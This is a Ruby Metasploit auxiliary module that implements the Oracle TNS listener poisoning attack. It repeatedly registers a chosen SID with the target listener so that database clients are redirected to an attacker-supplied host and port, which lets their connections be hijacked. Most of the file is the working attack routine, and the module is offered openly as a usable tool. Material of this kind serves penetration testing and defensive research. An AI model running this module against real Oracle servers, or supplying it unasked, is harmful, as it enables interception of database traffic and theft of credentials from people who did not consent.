require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include  Msf::Exploit::OracleTNS

	def initialize(info = {})
		super(update_info(info,
					'Name'           => 'TNS Posion Attack',
					'Description'    => %q{
					This module mimplement the TNS poisoning attack, discovered
					by Joxean Koret. It works for SIDs with length between 1-12
					thus with all possible length. It wast tested against
					11.2.0.3 64 bit on Windows and on Linux.
					},
					'Author'         => [ 'donctl' ],
					'License'        => MSF_LICENSE,
					'Version'        => '$Revision$',
					'References'     =>
					[
					[ 'URL', 'http://www.joxeankoret.com/download/tnspoison.pdf' ],
					],
					'DisclosureDate' => 'April 18 2012'))
		register_options(
			[
			OptString.new('DHOST', [ true, 	"HOST to redirect to, it should be"\
								" IP address only"]),
			OptString.new('DPORT', [ true, 	"PORT to redirect to, it can be 4"\
								" digits only", "1521"])
			], self.class)


		end

	def run
		while true
			print_status("Connect to %s:%s.\n" % [datastore["RHOST"], datastore["RPORT"]])
			#Connects to the server, creates the socket. The poisoned entries are there
			#until we disconnect
			if !tns_command("(CONNECT_DATA=(COMMAND=service_register_NSGR))")
				print_error("Something wrong with the connect packet!\n")
			end
			print_status("Sending register packet with SID %s to redirect to %s:%s\n." % [datastore["SID"],
				datastore["DHOST"], datastore["DPORT"]])
			if !send_register(datastore["SID"], datastore["DHOST"], datastore["DPORT"])
				print_error("Something wrong with the register packet!\n")
			end
			print_status("Wait for 10 seconds.\n")
			sleep(10)
			@sock.close
		end

	end
end
